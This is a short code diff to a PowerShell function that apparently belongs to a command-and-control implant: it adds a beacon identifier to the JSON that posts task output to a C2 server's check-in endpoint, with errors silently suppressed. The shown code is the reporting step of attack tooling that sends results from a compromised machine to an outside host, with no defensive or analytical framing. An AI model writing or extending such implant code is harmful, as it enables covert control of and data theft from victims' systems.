@@ -150,6 +150,7 @@ function Send-Result {
         $Body = @{
             task_id = $TaskID
             output = $Output
+            beacon_id = $BEACON_ID
         } | ConvertTo-Json
         Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json"
     } catch {}
